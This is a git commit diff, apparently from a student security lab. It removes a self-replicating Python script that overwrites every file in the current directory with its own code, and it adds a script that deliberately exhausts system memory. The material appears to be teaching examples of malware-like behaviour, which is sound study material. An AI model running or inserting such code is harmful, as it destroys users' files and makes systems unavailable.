ee47dbbd24922f362f337fe826d94fec265523a3
bhumikamaharjan <119515985+bhumikamaharjan@users.noreply.github.com>
2024-07-19 14:55:40 +0545

    Add files via upload

--- lab 4/4.2exhaust.py
+++ lab 4/4.2exhaust.py
@@ -1,27 +1,13 @@
-import os
+import random
 
-
-def self_replicate(directory):
-    # Get the name of the current script
-    current_script = os.path.abspath(__file__)
-
-    # Read the contents of the current script
-    with open(current_script, 'r') as file:
-        script_content = file.read()
-
-    # Iterate over all files in the specified directory
-    for filename in os.listdir(directory):
-        file_path = os.path.join(directory, filename)
-
-        # Only replicate to regular files, not directories or the current script itself
-        if os.path.isfile(file_path) and file_path != current_script:
-            with open(file_path, 'w') as target_file:
-                target_file.write(script_content)
-
+def exhaust_memory():
+    try:
+        large_list = []
+        while True:
+            # Append a large number of random floats to the list
+            large_list.extend([random.random() for _ in range(10**6)])
+    except MemoryError:
+        print("Memory exhausted!")
 
 if __name__ == "__main__":
-    # Specify the directory to replicate to (for demonstration purposes, we use the current directory)
-    target_directory = os.getcwd()
-
-    # Run the self-replication function
-    self_replicate(target_directory)
+    exhaust_memory()
